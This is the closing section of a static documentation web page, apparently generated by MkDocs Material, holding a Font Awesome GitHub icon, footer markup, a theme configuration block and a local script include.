      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.indexes", "toc.integrate", "toc.follo", "navigation.top", "header.autohide", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>